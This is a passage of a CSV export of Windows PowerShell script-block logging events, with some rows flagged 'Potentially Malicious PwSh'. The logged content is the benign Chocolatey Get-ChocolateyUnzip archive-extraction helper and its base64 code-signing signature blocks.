ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgwmHjAcUy+iE+dyiIfi2zB5dbGJZWd7DUt/no # Ll1cr0gwDQYJKoZIhvcNAQEBBQAEggEARX58JVHLurcXQTf7fttDVIUmw5vuH+lD # raYqEYC1l92+ucU8i5J015Gv8jVcDC4gXcE4hijQ6rryX4ikBymH/qmVWLrIA4NU # a2aYYcq26oWCODgd9NOPoPvBNLg6wZNCR+BNpZ7EQ92mY4+hR6SO2lmap2D/MHCQ # FrQ6UIbfUTTHZ6KuJn8hEMizgb9w7n9uwzqh4KkA0mp/MJEIGTQIuIQTZvNs/oZQ # yTqOyO1DTHfTUs3PrvsPyTQam8k2c1z9MftLTeeAsTEScGa0/wu0HPTBdlXPVN3R # AmPtXHvT64I/IDN9FQ+NV6OdHrlOitGteeh+B6qDkoF3zr9UGzrdpaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAzWjAjBgkqhkiG9w0BCQQxFgQUReNlyfyc12kJ8VKD # f/nnmCJJFB4wDQYJKoZIhvcNAQEBBQAEggEAbahPWSbk7P/cx1sVMWPwsMH7tEIi # mCqQdlL3sr1tKO0JGxndzqRPhk3doLiL4FyKlRs6F91d9tggZgwcVsPYLSAk9/84 # wbxqv2j/KzCY6uq0uuHUsYKTuCXn2cyYqB1Iu9GCj6szi3F8KlzlNEE6EPtVYHY6 # U4pxNhGijHdAMuMtaSuK+6ZYrICOdwPTbozno88gE1GV1nPgGmVr2mxN8fwExzd8 # 7tyNCSUJg9DaM9Jw4f3zPE64PaY2V+dqZW8bHn9U0sHS8HkTEwFki4j+pg91Tdxq # A4xJiCcSSTW60n7N2tSs7VNaDxtBVK6FX48t0jMCazDRpMgfKXm7wGlvkw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.477 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,70,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lD","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 1419c8c9-958e-44c3-9d03-ff48afcea7cc ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lD","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.477 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,71,"ScriptBlock: ZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # 